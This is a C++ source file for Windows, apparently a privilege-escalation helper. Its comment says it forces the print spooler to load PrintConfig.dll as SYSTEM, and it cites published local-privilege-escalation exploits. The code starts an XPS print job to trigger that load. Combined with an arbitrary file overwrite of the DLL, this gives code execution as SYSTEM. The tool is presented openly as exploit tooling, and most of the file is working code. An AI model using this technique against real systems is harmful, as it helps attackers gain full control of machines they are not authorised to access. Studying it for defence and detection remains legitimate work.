/*
	This tool will force the spooler service to load the 'PrintConfig.dll' DLL as SYSTEM.

	C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_xxxxxxxxxxxxxxxx\Amd64\PrintConfig.dll
	C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_x86_xxxxxxxxxxxxxxxx\I386\PrintConfig.dll

		PrintConfig.dll NT SERVICE\TrustedInstaller:(F)
				BUILTIN\Administrators:(RX)
				NT AUTHORITY\SYSTEM:(F)
				BUILTIN\Users:(RX)
				APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
				APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)

	Unlike other windows binaries, SYSTEM has full control over the file, which makes it a good target for
	arbitrary file move/overwrite exploits. 

	Credit:
		- @SandboxEscaper - ALPC Task Scheduler LPE Exploit 
		- @decoder_it - From arbitrary file overwrite to SYSTEM - https://decoder.cloud/2019/11/13/from-arbitrary-file-overwrite-to-system/
*/

#include <Windows.h>
#include <iostream>
#include <xpsprint.h>
#include <strsafe.h>

#pragma warning(disable : 4995) // 'IXpsPrintJob' and 'StartXpsPrintJob' are deprecated
#pragma comment(lib, "XpsPrint.lib")

int main()
{
	HRESULT hRes;
	HANDLE hCompletionEvent;
	WCHAR wszTempPath[MAX_PATH];

	GetTempPath(MAX_PATH, wszTempPath);
	
	hRes = CoInitialize(nullptr);
	if (SUCCEEDED(hRes))
	{
		wprintf(L"[*] CoInitialize() - OK\n");

		IXpsOMObjectFactory* xpsObjectFactory;
		hRes = CoCreateInstance(__uuidof(XpsOMObjectFactory), NULL, CLSCTX_INPROC_SERVER, __uuidof(IXpsOMObjectFactory), reinterpret_cast<LPVOID*>(&xpsObjectFactory));
		if (SUCCEEDED(hRes))
		{
			wprintf(L"[*] CoCreateInstance() - OK\n");

			hCompletionEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
			
			WCHAR wszTempFile[MAX_PATH];
			StringCchPrintf(wszTempFile, MAX_PATH, L"%ls\\print.txt", wszTempPath);

			IXpsPrintJob* xpsPrintJob;
			IXpsPrintJobStream* xpsPrintJobStream;
			hRes = StartXpsPrintJob(L"Microsoft XPS Document Writer", L"Print Job 1", wszTempFile, NULL, hCompletionEvent, NULL, 0, &xpsPrintJob, &xpsPrintJobStream, NULL);
			if (SUCCEEDED(hRes))
			{
				wprintf(L"[*] StartXpsPrintJob() OK\n");
				xpsPrintJobStream->Close();
			}
			else
			{
				wprintf(L"[*] StartXpsPrintJob() failed (Err: 0x%08X)\n", hRes);
			}
		}
		else
		{
			wprintf(L"[*] CoCreateInstance() failed (Err: 0x%08X)\n", hRes);
		}

		CoUninitialize();
	}
	else
	{
		wprintf(L"[*] CoInitialize() failed (Err: 0x%08X)\n", hRes);
	}

	return 0;
}

